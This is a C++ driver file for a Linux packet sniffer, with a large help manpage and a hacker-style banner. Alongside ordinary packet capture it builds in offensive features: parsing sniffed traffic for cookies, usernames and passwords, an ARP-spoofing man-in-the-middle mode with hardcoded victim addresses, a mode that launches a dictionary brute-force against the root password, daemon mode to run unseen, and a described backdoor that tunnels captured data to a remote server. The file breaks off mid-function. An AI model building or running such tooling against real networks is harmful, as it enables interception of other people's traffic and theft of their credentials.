/***************************************************************************************************************|
|*                                                                                                            * |
|    *                                                                                                       *  |
| *     * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *   |
|      **                                                                                                  **   |
|  *  * *                                       ~~~~~5N1FF3R~~~~~                                         * *   |
|    *  *                                                                                                *  *   |
|   * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *   *   |
|   *   * File Name:   sniff.cpp driver file                                                            *   *   |
|   *   * Description: Packet sniffer to monitor data over the wire or air.                             *   *   |
|   *   * Disclaimer:  Not held responsible for unauthorized use over certain medians, USE AT OWN RISK  *   *   |
|   *   *              The code here, as is, is for demonstraion purposes only.                         *   *   |
|   *   * Permissions: Needs root privileges or run via a sticky-gicky bit +s or +g                     * 4 *   |
|   *   * Libraries:   sudo apt-get install libsctp-dev lksctp-tools                                    *   *   |
|   * p * Compiler:    g++                                                                              * 1 *   |
|   *   * c++ Version: c++11, good amount of c-style code in main Sniffer class.                        *   *   |
|   * w * Compileing:  g++ -std=c++11 sniffer.h sniffer.cpp forward_list.h node.h dumpParser.h          * 1 *   |
|   *   *              dumpParser.cpp sniff.cpp -o Sniffer                                              *   *   |
|   * n *              -g to debug da BUGS                                                              *   *   |
|   *   * Editor:      gvim, some veiws can be visually different so use gvim or vim if allignments     * d *   |
|   * ' *              or view look off                                                                 *   *   |
|   *   * Example Run: sudo ./Sniffer -I wlan0 -D packet.log -P parse.log -u -R read.log -ALL -v -mp    * 4 *   |
|   * n * Help:        Manpage within function below or ./Sniffer -h                                    *   *   |
|   *   * Version:     0x0030                                                                           * 7 *   |
|   *   * Last Update: 05/01/15                                                                         *   *   |
|   *   * Thanks:      To computers for being awsome..........                                          *   *   |
|   *   *              >>>>> SCREW YOU SCRIPT KIDDY BITCHES!!!                                          *   *   |
|   *   *              pwn'n all day everyday                                                           *   *   |
|   *   *              Im out                                                                           *
                                                                                                        *   *   |
|   *   * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *   |
|   *  *                                                                                                *  *    |
|   * *   )))~3L1735~(((                         0P3N Y0UR 3Y35                                    30f  * *     |
|   **                                                                                                  **      |
|   * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *     |
|  *                                             (C) Copyright - Ryan Lockman                              *    |
| *                                                                                                         *   |
|***************************************************************************************************************/

// Version Define
#define SNIFFERVERSION 0x0030

// Check Linux Distro
#ifndef __linux__
# error "Linux Required, Idiot!"
#endif

// Feature Test Macros
#ifndef _GNU_SOURCE  // strsignal() declaration from <cstring>
# define _GNU_SOURCE
#endif

// Headers
#include <iostream>
#include <string>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <csignal>
#include <iomanip>
#include <string>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "forward_list.h" // local
#include "sniffer.h"      // local

// Misc Defines
#define EGGS " eggs( ) eggs( ) eggs( ) crack(~) " // eggs...

// ANSI Excape Macro Defines
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define NF      "\033[0m"
#define CLRLN   "\033[2K"
#define CUP     "\033[1A"
#define CLRSCRN "\033[2J\033[1;1H"

// Daemon Bit-Masks Defines
#define DAEM_NO_CHDIR         0x01 // no change to root dir
#define DAEM_NO_CLOSE_FILES   0x02 // no close of open files
#define DAEM_NO_REOPEN_STDFDS 0x04 // no reopen, direct stdin, stdout, stderr to /dev/null
#define DAEM_NO_UMASK         0x08 // no umask

// Daemon Limit Defines
#define DAEM_MAX_CLOSE 8192  // max close on sysconf(_SC_OPEN_MAX) fail

// Static Conditionals
static volatile sig_atomic_t sigCond = 0; // signal condition variable for terminal SIGINT, SIGQUIT
                                          // or for daemon SIGHUP

// Function Prototypes
static void  sighand     (int sig) { sigCond = 1; } // signal handler
static void  printSniffer(const Sniffer &sniff, const int len);
static void  usage       (const char* const programName);
static int   becomeDaemon(const int flags);
static pid_t arpMITM     (const char* const iface, const char* const V_ip,  const char* const S_ip,
                                                   const char* const V_mac, const char* const S_mac);
static pid_t crackRoot();
static void printWaitStat(const std::string *const msg, const int status);

// Main
int main(int argc, char **argv) {
// Check Args
    if(argv[1]) // check incase seg fault
        if(!std::strncmp(argv[1], "-h", std::strlen("-h") + 1)) {
            usage(argv[0]);        
            return EXIT_FAILURE;
        }
    
// Process Args and Flags
    Forward_List<std::string> Args;           // args list
    for(char **chr = &argv[1]; *chr; ++chr) { // fill list
        std::string str(*chr);
        Args.push_front(str);
    }   
    Args.reverse(); // reverse for correct order, dont really need to becasue we parse anyways

    // Check Crack Root Flag
    bool crkFlag = false;
    if(getuid() || geteuid()) { // check root, mite not need to crack, CAP_NET_RAW
         if(Args.contains((std::string)"-CRACK")) {
            crkFlag = true;
            crackRoot();
            // Wait for Dead Children
            for(int status = 0; !WIFEXITED(status) || !WIFSIGNALED(status); printWaitStat(NULL, status)) {
                pid_t cPid = waitpid(-1, &status, WUNTRACED 
                                     #ifdef WCONTINUED // > linux 2.6.10
                                        | WCONTINUED
                                     #endif
                                     );
                if(cPid == -1) {
                    std::perror("waitpid");
                    break;
                }

                // Print Child's Obituary
                std::cout << "\nwaitpid() Returned: PID: " << (long)cPid << " Status: 0x" << std::hex
                          << status << std::dec << " (" << (status >> 8) << ", " << (status & 0xff) << ")\n";
            }
        }
        else {
            std::cerr << RED << "\nError" << NF << ", Must Be Root\n\n";
            return EXIT_FAILURE;
        }
    }

    // Set Dump File Flag
    std::string dfile;
    if(Args.contains((std::string)"-D")) {
        int pos = Args.get_member_pos((std::string)"-D");   // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "get_member_pos";
            return EXIT_FAILURE;
        }

        if(Args.get_data_pos(++pos) == std::string()) { // check against default for empty
            std::cerr << RED << "\nError" << NF << ", Check manual(-h), -D needs an argument\n"
                      << std::endl; // flushes via endl
            return EXIT_FAILURE;
        }

        dfile = argv[pos]; // incremented earlier
    }
    else {
        std::cout << YELLOW << "\ndefaulting to a local dump at packet.log" << NF << ", check manual(-h).\n";
        std::fflush(stdout);
        sleep(1);
        dfile = "packet.log";
    }

    // Set Interface Flag
    std::string iface;
    if(Args.contains((std::string)"-I")) {
        int pos = Args.get_member_pos((std::string)"-I");   // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "get_member_pos";
            return EXIT_FAILURE;
        }

        iface = argv[++pos];
    }
    else {
        std::cout << YELLOW << "\ndefaulting to wlan0 interface" << NF << ", check manual(-h).\n";
        std::fflush(stdout);
        sleep(1);
        iface = "wlan0";
    }

    // Set Seconds Timeout Flag
    time_t secs = 0;
    if(Args.contains((std::string)"-Ts")) { // seconds
        int pos = Args.get_member_pos((std::string)"-Ts"); // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "get member pos";
            return EXIT_FAILURE;
        }

        secs = (time_t)std::atoi(argv[++pos]);
    }

    // Set Mircroseconds Timeout Flag
    suseconds_t usecs = 0;   
    if(Args.contains((std::string)"-Tu")) { // microseconds
        int pos = Args.get_member_pos((std::string)"-Tu"); // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "get member pos";
            return EXIT_FAILURE;
        }

        usecs = (suseconds_t)std::atoi(argv[++pos]);
    }

    // Check If One Or None Of Our Timeouts Are Set, Default It
    if(!secs && !usecs) {
        secs  = 0;     // be explicit
        usecs = 60000; // 60 microsends
    }
    else if(!secs && usecs)
        secs = 0;
    else if( secs && !usecs)
        usecs = 0;
    else { // shouldn't fail
        std::cerr << "\ntimeout flag error";
        return EXIT_FAILURE;
    }

    // Set Packet Type Flag
    std::string pType;
    if     (Args.contains((std::string)"-TCP" ))
        pType = "-TCP";
    else if(Args.contains((std::string)"-UDP" ))
        pType = "-UDP";
    else if(Args.contains((std::string)"-SCTP"))
        pType = "-SCTP";
    else if(Args.contains((std::string)"-ICMP"))
        pType = "-ICMP";
    else if(Args.contains((std::string)"-IGMP"))
        pType = "-IGMP";
    else if(Args.contains((std::string)"-IP"  ))
        pType = "-IP";
    else if(Args.contains((std::string)"-ARP" ))
        pType = "-ARP";
    else if(Args.contains((std::string)"-ALL" ))
        pType = "-ALL";
    else {
        std::cout << YELLOW << "\ndefaulting to -ALL packets" << NF << ", check manual(-h).\n";
        std::fflush(stdout);
        sleep(1);
        pType = "-ALL";
    }

    // Set Parse File Flag
    std::string look, pfile;
    bool parseFlag = false;
    if(Args.contains((std::string)"-P")) {
        int pos = Args.get_member_pos((std::string)"-P");   // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "get_member_pos";
            return EXIT_FAILURE;
        }

        pfile     = argv[++pos];
        parseFlag = true;

        // Set Look Flag
        if     (Args.contains((std::string)"-c" ))
            look = "Cookie";
        else if(Args.contains((std::string)"-u" ))
            look = "Host";
        else if(Args.contains((std::string)"-w"))
            look = "Password";
        else if(Args.contains((std::string)"-a"))
            look = "User-Agent";
        else {
            std::cout << YELLOW << "\ndefaulting to -u" << NF << ", check manual(-h).\n";
            std::fflush(stdout);
            sleep(1);
            look = "Host";
        }
    }
 
    // Set Readable Dump File Flag
    std::string rfile;
    bool readFlag = false;
    if(Args.contains((std::string)"-R")) {
        int pos = Args.get_member_pos((std::string)"-R");   // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "get_member_pos";
            return EXIT_FAILURE;
        }

        rfile    = argv[++pos];
        readFlag = true;
    }

    // Set Verbose Flag   
    bool vFlag = false;
    if(Args.contains((std::string)"-v"))
        vFlag = true;

    // Set IP Filter Flag
    std::string ip;
    bool ipFlag = false;
    if(Args.contains((std::string)"-FI")) {
        int pos = Args.get_member_pos((std::string)"-FI");  // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "\nget_member_pos";
            return EXIT_FAILURE;
        }

        ip     = argv[++pos];
        ipFlag = true;
    }
    
    // Set MAC Filter Flag
    std::string mac;
    bool macFlag = false;
    if(Args.contains((std::string)"-FM")) {
        int pos = Args.get_member_pos((std::string)"-FM"); // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "\nget_member_pos";
            return EXIT_FAILURE;
        }

        mac     = argv[++pos];
        macFlag = true;
    }

    // Set Port Flag
    unsigned port = 0;
    bool portFlag = false;
    if(Args.contains((std::string)"-p")) {
        int pos = Args.get_member_pos((std::string)"-p");   // shouldn't fail, we checked via contains
        if(pos == -1) {
            std::cerr << "\nget_member_pos";
            return EXIT_FAILURE;
        }
        
        port     = std::atoi(argv[++pos]);
        portFlag = true;
    }
    else if(pType == "-TCP" || pType == "-UDP" || pType == "STCP") {
        std::cout << YELLOW << "\ndefaulting to port 80" << NF << ", check manual(-h).\n";
        std::fflush(stdout);
        sleep(1);
        port = 80;
    }

    // Set Daemon Flag
    bool dFlag = false;
    if(Args.contains((std::string)"-md"))
        dFlag = true;

    // Set Radio Frequency Mode Flag(monitor mode)
    bool rfmFlag = false;
    if(Args.contains((std::string)"-mr"))
        rfmFlag = true;

    // Set Promiscuous Mode Flag
    bool pmscFlag = false;
    if(Args.contains((std::string)"-mr"))
        pmscFlag = true;

    // ARP Man In The Middle Flag
    const char *const V_ip  = "192.168.0.2",
               *const S_ip  = "192.168.0.1",
               *const V_mac = "1c:3e:84:8a:4c:26",
               *const S_mac = "00:26:88:EA:84:08";
    bool mitmFlag           = false;
    pid_t cPid = 0;
    if(Args.contains((std::string)"-MITM")) {
        cPid = arpMITM(iface.c_str(), V_ip, S_ip, V_mac, S_mac);
        mitmFlag = true;
    }

    // Set Up Debug Mode
    bool debugFlag = false;
    if(Args.contains((std::string)"-dm"))
        debugFlag = true;

// Set Up Signals Accordinaly
    // Initialize Siganl Action
    struct sigaction sa;
    std::memset(&sa, 0, sizeof(sa));  
    sigemptyset(&sa.sa_mask);  
    sa.sa_handler = sighand;

    // Check Flags
    if(!dFlag) {     // terminal mode
        sigfillset(&sa.sa_mask);                      // block all signals
        if(sigaction(SIGINT,  &sa, NULL) == -1) {     // handle interrupt
            std::perror("sigaction");
            return EXIT_FAILURE;
        }
        if(sigaction(SIGQUIT, &sa, NULL) == -1) {     // handle quit
            std::perror("sigaction");
            return EXIT_FAILURE;
        }
        if(sigaction(SIGHUP, &sa, NULL) == -1) {      // handle hangup
            std::perror("sigaction");
            return EXIT_FAILURE;
        }
        
        // Check Man In The Middle Flag
        if(mitmFlag)
            if(sigaction(SIGCHLD, &sa, NULL) == -1) { // handle child
                std::perror("sigaction - SIGCHLD");
                return EXIT_FAILURE;
            }
    }
    else if(dFlag) { // daemon mode
        sa.sa_flags = SA_RESTART;                     // restart flag
        if(sigaction(SIGHUP, &sa, NULL) == -1) {      // handle hangup
            std::perror("sigaction");
            return EXIT_FAILURE;
        }
        // Don't Handle Child Incase User Killed It, Parent Continues To Sniff Until Hangup

        // Become A Daemon
        if(becomeDaemon(0)) {
            std::cerr << "\nbecomeDaemon failed";
            return EXIT_FAILURE;
        }
    }

// Create Sniffer
    Sniffer sniff(iface.c_str(), dfile.c_str(), pfile.c_str(), parseFlag, rfile.c_str(), look, readFlag, debugFlag);
    if(!sniff.createSniffer(pType, port, rfmFlag, pmscFlag, secs, usecs))
        return EXIT_FAILURE;

// Verbose
    if(vFlag && !dFlag) {
        std::cout << "\nSniffer Started..." << std::endl;
        sleep(2);                                     // sleep for verbose
    }

////////////////////////////////////////////////////
//sniff.tunnel_out();

// Infinite Sniff Loop (  Sniffer's Heart   )******//
    for(int len = 0; !sigCond;) {                  //
        len = sniff.sniffPackets();                //
        if(vFlag && !dFlag)                        //
            printSniffer(sniff, len);              //
    }                                              //
//*************************************************//

// Cleanup
    // Verbose
    if(vFlag && !dFlag) {
        std::cout << "\n\nCleaning Up...";
        std::fflush(stdout);                          // flush
    }
    sleep(1);                                         // sleep for verbose
    
    // Check For Flag To Shutdown Monitor Mode Or Not
    bool monOff = true;
    if(Args.contains((std::string)"-o"))//////////////////////////////fix when using eth0 it tries to shutoff rfmon when no -o in cmd line
        monOff = false;

    // Close Sniffer
    if(sniff.closeSniffer(monOff)) {
        std::cerr << " [" << RED << "BAD" << NF << ']';
        return EXIT_FAILURE;
    }

    // Sure Kill Child
    if(kill(cPid, SIGKILL)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("kill");
        return EXIT_FAILURE;
    }

    // Verbose
    if(vFlag && !dFlag) {
        std::cout << " [" << GREEN "OK" << NF << ']'; // cleanup successful
        std::cout << "\n\nGood-Bye!\n\n";
    }
    else { 
        if(!dFlag) // only print if no daemon
            std::cout << std::endl;
    }
   
// Success
    return EXIT_SUCCESS;
}

// Function Implementations
void printSniffer(const Sniffer &sniff, const int len) {
    // Declarations
    std::string dscrpt;
    double total  = 0;

    // Print Stats
    std::cout << CLRSCRN
              << "\nSniffed: "
              << len             << " Byte Packet"
              << "\n         "
              << sniff.getMGMT()        << " Wifi MGMT, "
              << sniff.getCTRL()        << " Wifi CTRL, "
              << sniff.getData()        << " Wifi Data, "
              << sniff.getQOS()         << " Wifi QOS Data"
              << "\n         "                     
              << sniff.getEXT()         << " Wifi EXT, "
              << sniff.getWDS()         << " Wifi WDS"
              << "\n         "             
              << sniff.getDataCtrl()    << " Wifi Data Control, "
              << sniff.getQOSCtrl()     << " Wifi QOS Data Control"
              << "\n         "
              << sniff.getDataEncrypt() << " Wifi Encrypted(STP/ARP/IP/TCP/HTTP...)"
              << "\n         "             
              << sniff.getARP()  << " ARP, "
              << sniff.getPAE()  << " PAE, "
              << sniff.getTDLS() << " TDLS, "
              << sniff.getSTP()  << " STP"
              << "\n         "
              << sniff.getTCP()  << " TCP, "
              << sniff.getUDP()  << " UDP, "
              << sniff.getSCTP() << " SCTP, "
              << sniff.getICMP() << " ICMP, "
              << sniff.getIGMP() << " IGMP"
              << "\n         "
              << sniff.getOtherDataLink()  << " Other Data-Link, "
              << sniff.getOtherNetwork()   << " Other Network, "
              << sniff.getOtherTransport() << " Other Transport"
              << "\n         "
              << RED   << sniff.getLocalStoredDrop()       << NF << " Dropped Packets "
              << RED   << sniff.getLocalStoredIncomplete() << NF << " Incomplete Packets"
              << "\n         "
              << GREEN << sniff.getTotalP()                << NF << " Total Packets"
              << "\n         ";

    // Normalize Bytes Into KB/MB/GB/TB
    if((((((float)sniff.getTotalB() / 1024.00) / 1024.00) / 1024.00) / 1024.00) > 1.00) {
        dscrpt = " TB";
        total  = ((((float)sniff.getTotalB() / 1024.00) / 1024.00) / 1024.00) / 1024.00; // need decimal
    }
    else if(((((float)sniff.getTotalB() / 1024.00) / 1024.00) / 1024.00) > 1.00) {
        dscrpt = " GB";
        total  =  (((float)sniff.getTotalB() / 1024.00) / 1024.00) / 1024.00;
    }
    else if((((float)sniff.getTotalB() / 1024.00) / 1024.00) > 1.00) {
        dscrpt = " MB";
        total  =   ((float)sniff.getTotalB() / 1024.00) / 1024.00;
    }
    else if(((float)sniff.getTotalB() / 1024.00) > 1.00) {
        dscrpt = " KB";
        total  =    (float)sniff.getTotalB() / 1024.00;
    }
    else {
        dscrpt = " B";
        total  =    (float)sniff.getTotalB();
    }

    // Print Cont.
    std::cout << std::showpoint << std::fixed << std::setprecision(2) << GREEN << total << NF << dscrpt;
    std::cout.unsetf(std::ios::showpoint); // unset
    std::cout.unsetf(std::ios::fixed);     // unset
    std::cout << "\n         "
              << GREEN << sniff.getRxRingOffset() << NF << " RX Ring Offset"
              << std::endl; // flush n' newline
}

void usage(const char * const programName) {
    std::cout << "\n Usage: " << programName << " [args-optional...]\n"
              << GREEN
              << "\n ************************************************************************************************"
              << "\n *                                        -MANPAGE-                                             *"
              << "\n *``````````````````````````````````````````````````````````````````````````````````````````````*"
              << "\n *  Arg Name      Symbol      Symbol Arg                  Description                           *"
              << "\n * ```````````````````````````````````````````````````````````````````````````````````````````` *"
              << "\n *  dump-file:      -D       /file-path          Where to dump the packets, defaults to         *"
              << "\n *                                                local ran directory as packet.log             *"
              << "\n *  interface:      -I       device name         wlan0, eth0, lo, mon0...                       *"
              << "\n *                                                                                              *"
              << "\n *  readable-file:  -R       /file-path          Where to output un-parsed readable packets     *"             
              << "\n *  parse-file:     -P       /file-path -c...    Where to output parsed [look-for] arguments    *"
              << "\n *  look-for:       -c                           Parse for cookies                              *"
              << "\n *                  -u                           Parse for urls                                 *"
              << "\n *                  -w                           Parse for userernames and passwords            *"
              << "\n *                  -a                           Parse for user agents(browser fingerprints),   *"
              << "\n *                                               [look-for] defaults to -u if not specified,    *"
              << "\n *                                                argument doesn't have to be directly after    *"
              << "\n *                                                parse-file -P /file-path                      *"
              << "\n *  timeouts        -Ts      3...                The computer can be overwhelmed by incoming    *"
              << "\n *                  -Tu      60000...             packets, to lighten the load assign timeouts, *"
              << "\n *                                                seconds assigned with -Ts and mircoseconds    *"
              << "\n *                                                -Tu(1000 microseconds in a millasecond...),   *"
              << "\n *                                                if only one is suppled the other defaults to  *"
              << "\n *                                                0 and if neither are supplied it defaults to  *"
              << "\n *                                                60000 microsends which equals 60 millseconds  *"
              << "\n *  IP-filter:      -FI      192.168.0.1         Filter by IP  address                          *"
              << "\n *  MAC-filter:     -FM      26:HF:C8:96:00:AF   Filter by MAC address                          *"
              << "\n *  daemon-mode:    -md                          Daemon mode, when on make sure to include      *"
              << "\n *                                                full file paths                               *"
              << "\n *  promisc-mode:   -mp                          Promiscuous mode to sniff all packets on       *"
              << "\n *                                                ethernet wired hardware type                  *"
              << "\n *  monitor-mode:   -mr                          Monitor mode to sniff all packets through      *"
              << "\n *                                                wirreless radiotap interface, may not work on *"
              << "\n *                                                certain wireless cards                        *"
              << "\n *  mon-mode off:   -o                           Turn..........FILL IN****************************"
              << "\n *  verbose:        -v                           Visually output to terminal, auto disables if  *"
              << "\n *                                                daemon mode specified                         *"
              << "\n *  packet-types:   -TCP     -p 80...            Sniff only TCP  packets                        *"
              << "\n *                  -UDP     -p 69...            Sniff only UDP  packets                        *"
              << "\n *                  -SCTP    -p 80...            Sniff only SCTP packets                        *"
              << "\n *                  -ICMP    -o code...          Sniff only ICMP Packets                        *"
              << "\n *                  -IGMP    -o code...          Sniff only IGMP packets                        *"
              << "\n *                  -IP                          Sniff all  IPv4 packets                        *"
              << "\n *                  -IPv6                        Sniff all  IPv6 packets                        *"
              << "\n *                  -ARP     -o code...          Sniff only ARP  frames (address resolution)    *"
              << "\n *                  -PAE                         Sniff only PAE  frames (port access entity)    *"
              << "\n *                                                EAP 802.1x                                    *"
              << "\n *                  -STP                         Sniff only STP frames (spanning tree protocol) *"
              << "\n *                                                802.1d                                        *"
              << "\n *                  -PPP                         Sniff only PPP (point-to-point protocol)       *"
              << "\n *                  -PPPoE                       Sniff only PPPoE frames (point-to-point        *"
              << "\n *                                                protocol over ethernet), used by manys ISP's  *"
              << "\n *                  -TDLS                        Sniff only TDLS(tunneled direct link setup)    *"
              << "\n *                                                802.11z, similar to Wifi-Direct               *"
              << "\n *  frame-types:    -MGMT    -s subtype...       Sniff only wifi(-I wlan0) management frames    *"
              << "\n *                  -CTRL    -s subtype...       Sniff only wifi(-I wlan0) control frames       *"
              << "\n *                  -QOS     -s subtype...       Sniff only wifi(-I wlan0) quality of service   *"
              << "\n *                                                data frames                                   *"
              << "\n *                  -DATA    -s subtype...       Sniff only wifi(-I wlan0) data frames          *"
              << "\n *                  -NODATA  -s subtype...       Sniff only wifi(-I wlan0) data(no data) frames *"
              << "\n *                                                No data is a dataless frame which is used     *"
              << "\n *                                                like a control frame                          *"
              << "\n *  all packets     -ALL                         Sniff all packets/frames (Defaults to -ALL)    *"
              << "\n *  frame-subtypes: -S       frame subtype       Filter by frame subtype, only for 802.11 wifi  *"
              << "\n *                                                -PROBEREQ                                     *"
              << "\n *                                                -PROBERESP                                    *"
              << "\n *  port-filter:    -p       portno              Only for TCP, UDP, SCTP, auto disables if      *"
              << "\n *                                                other [packet-types] are specified,           *"
              << "\n *                                                auto defaults to HTTP port 80 if not          *"
              << "\n *                                                specified, argument doesn't have to be        *"
              << "\n *                                                directly after -TCP, -UDP, or -SCTP           *"
              << "\n *                                               Well-Known Ports: T = TCP, U = UDP             *"
              << "\n *                                                Daytime: 13,                         T / U    *"
              << "\n *                                                FTP:     20/21,   regular/command,   TU/T     *"
              << "\n *                                                FTPS:    989/990, regular/command,   TU/T     *"
              << "\n *                                                SSH:     22,                         T / U    *"
              << "\n *                                                TELNET:  23,                         T / U    *"
              << "\n *                                                TELNETS: 992,                        T / U    *"
              << "\n *                                                SMTP:    25/26,   regular/encrypted, T /TU    *"
              << "\n *                                                SMTPS:   465,                        T        *"             
              << "\n *                                                DNS:     53,                         T / U    *"
              << "\n *                                                MTP:     57,                         T        *"
              << "\n *                                                Finger:  79,                         T        *"
              << "\n *                                                HTTP:    80,                         T        *"
              << "\n *                                                HTTPS:   443,                        T / U    *"             
              << "\n *                                                POP2:    109,                        T        *"
              << "\n *                                                POP3:    110,                        T        *"
              << "\n *                                                POP3S:   995,                        T / U    *"             
              << "\n *                                                SQL:     118/156, services/service,  TU/TU    *"
              << "\n *                                                IRC:     194,                        T / U    *"
              << "\n *                                                IRCS:    994,                        T / U    *"             
              << "\n *                                                LDAP:    389,                        T / U    *"
              << "\n *                                                LDAPS:   389,                        T / U    *"             
              << "\n *                                                SLP:     427,                        T / U    *"
              << "\n *                                                DHCPv6:  546/547, client/server,     TU/TU    *"
              << "\n *                                                -Check online for port list...                *"
              << "\n *  arp-mitm-attk:  -MITM                        If operating over a switched network instead   *"
              << "\n *                                                of a hub, arp posion and arp spoof a victim,  *"
              << "\n *                                                or the entire network, performing a man in    *"
              << "\n *                                                the middle attack, redirecting all traffic    *"
              << "\n *                                                through you                                   *"
              << "\n *  dctnry-attk:    -CRACK                       If operating on a computer with no root        *"
              << "\n *                                                access, try to bruteforce shadow pass file    *"
              << "\n *                                                via a dictionary attack                       *"
              << "\n *                                                WARNING - can take a very long time           *"
              << "\n *                                                          depending on password strength      *"
              << "\n *                                                          and location in dictionary          *"
              << "\n *  backdoor-mode   -BDOOR                       If running on seperate computer this mode will *"
              << "\n *                                                open a socket and tunnel all captured packet  *"
              << "\n *                                                data to a remote server, recommend filters    *"
              << "\n *  debug-mode      -dm                          Before each packet is printed this prints a    *"
              << "\n *                                                hex dump of the full packet, starting with    *"
              << "\n *                                                TPacket, Sockaddr_ll, then data-link on up.   *"
              << "\n *                                                *includes pads for tpacket and sockaddr_ll    *"
              << "\n *----------------------------------------------------------------------------------------------*"
              << "\n * eof                                                                                          *"
              << "\n ************************************************************************************************\n\n"
              << NF;
}

int becomeDaemon(const int flags) {
    // Declarations
    int fd = 0;

    // Fork Program Flow
    switch(fork()) {
        // Error
        case -1:
            std::perror("fork");
            return -1;
        // Child, Falls Off Ledge
        case 0:
            break;
        // Parent, Kills Itself
        default: 
            _exit(EXIT_SUCCESS); // hard exit
    }

    // Escalete Self To New Session Leader, Freeing Self From Terminal
    if(setsid() == -1) {
        std::perror("setsid");
        return -1;
    }

    // Fork Program Flow Again, Diminish Self Of Session Leader For No Future Controlling Terminal
    switch(fork()) {
        // Error
        case -1:
            std::perror("fork");
            return -1;
        // Child, Falls Off Ledge
        case 0:
            break;
        // Parent, Kills Itself
        default: 
            std::cout << GREEN << "\nEntering Daemon Mode" << NF << "...Bye Bye\n\n";
            std::fflush(stdout);
            sleep(2);
            _exit(EXIT_SUCCESS); // hard exit
    }

    // Clear Process Mask For File Permissions
    if(!(flags & DAEM_NO_UMASK))
        umask(0);

    // Switch To Root Dir Incase Of Temp Dir
    if(!(flags & DAEM_NO_CHDIR))
        if(chdir("/")) {
            std::perror("chdir");
            return -1;
        }

    // Close All File Descriptors
    if(!(flags & DAEM_NO_CLOSE_FILES)) {
        int maxfd = sysconf(_SC_OPEN_MAX); // max file descriptors
        if(maxfd == -1)                    // unknown limit
            maxfd = DAEM_MAX_CLOSE;        // guess

        for(fd = 0; fd < maxfd; fd++)      // close all
            close(fd);
    }

    // Reopen stdout, stdin, stderr And Direct to /dev/null (text quiet mode)
    if(!(flags & DAEM_NO_REOPEN_STDFDS)) {
        close(STDIN_FILENO);

        if((fd = open("/dev/null", O_RDWR)) == -1) {
            std::perror("open");
            return -1;
        }

        // Check If Descriptor Is 0
        if(fd != STDIN_FILENO)
            return -1;

        // Duplicate stdout To stdin
        if(dup2(STDIN_FILENO, STDOUT_FILENO) != STDOUT_FILENO)
            return -1;

        // Duplicate stderr To stdin
        if(dup2(STDIN_FILENO, STDERR_FILENO) != STDERR_FILENO)
            return -1;
    }

    // Success
    return 0;
}

pid_t arpMITM(const char* const iface, const char* const V_ip,  const char* const S_ip,
                                       const char* const V_mac, const char* const S_mac) {
    // Get Flag Mask
    int flags = fcntl(STDOUT_FILENO, F_GETFD);
    if(flags == -1) {
        std::perror("fcntl - F_GETFD");
        return (pid_t)-1;
    }
        
    // OR In Bit
    flags |= FD_CLOEXEC; // close file descriptors on exec
        
    // Set Flag Mask
    if(fcntl(STDOUT_FILENO, F_SETFD, flags) == -1) {
        std::perror("fcntl - F_SETFD");
        return (pid_t)-1;
    }
    
    // Fork Program Flow Into New Prcess
    pid_t cPid = fork();
    switch(cPid) {
        // Error
        case -1:
            std::perror("fork");
            return (pid_t)-1;
        // Child
        case 0:
            // Let Parent Finish Important Set Up Precedures
            sleep(5);

            // Execute Man In The Middle
            execlp("./ASPOOF", "ASPOOF", iface, V_ip, S_ip, V_mac, S_mac, (char*)NULL);
            std::perror("execlp"); // error
            return (pid_t)-1;
        // Parent
        default:
            return cPid;
    }
}

pid_t crackRoot() {
    // Get Flag Mask
    int flags = fcntl(STDOUT_FILENO, F_GETFD);
    if(flags == -1) {
        std::perror("fcntl - F_GETFD");
        return (pid_t)-1;
    }
        
    // OR In Bit
    flags |= FD_CLOEXEC; // close file descriptors on exec
        
    // Set Flag Mask
    if(fcntl(STDOUT_FILENO, F_SETFD, flags) == -1) {
        std::perror("fcntl - F_SETFD");
        return (pid_t)-1;
    }
    
    // Fork Program Flow Into New Prcess
    pid_t cPid = fork();
    switch(cPid) {
        // Error
        case -1:
            std::perror("fork");
            return (pid_t)-1;
        // Child
        case 0:
            // Let Parent Finish Important Set Up Precedures
            sleep(2);

            // Execute Man In The Middle
            execlp("gnome-terminal", "gnome-terminal", "-e", "./Brute passwords.txt root 500 0", (char*)NULL);
            std::perror("execlp"); // error
            return (pid_t)-1;
        // Parent
        default:
            return cPid;
    }
}

/* std::cout is non-reentrant, so this function is also non-reentrant,
 * should not be used in a signal handler (non-async-signal-safe) */
void printWaitStat(const std::string *const msg, const int status) {
    // Print Optional Message
    if(msg)
        std::cout << msg << std::endl;

    // Process Exit Status
    if(WIFEXITED(status))          // exited normally, probe exit status(lower 8 bts(0-255))
        std::cout << "Child Exited: Status: "   << WEXITSTATUS(status);
    else if(WIFSIGNALED(status)) { // killed by a signal, probe exit signal number and core dump
        std::cout << "\nChild Killed: Signal: " << WTERMSIG(status) << " (" << strsignal(WTERMSIG(status)) << ')';
        
#       ifdef WCOREDUMP            /* Not in SUSv3, absent on some systems */
        if(WCOREDUMP(status))
            std::cout << " (core dumped)";
#       endif
    }
    else if(WIFSTOPPED(status))    // stopped by a signal, probe stop signal number
        std::cout << "\nChild Stopped: Signal: " << WSTOPSIG(status) << " (" <<  strsignal(WSTOPSIG(status)) << ')'; 
#   ifdef WIFCONTINUED             /* SUSv3 has this, older Linux versions and some UNIX implementations don't */
    else if(WIFCONTINUED(status))  // continued by a signal
        std::cout << "\nChild Continued: Signal: (" << strsignal(SIGCONT) << ')';
#   endif
    else                           // shouldn't get here
        std::cout << "\nChild Is Missing? (status: " << (unsigned)status << ')';
    
    // End Line
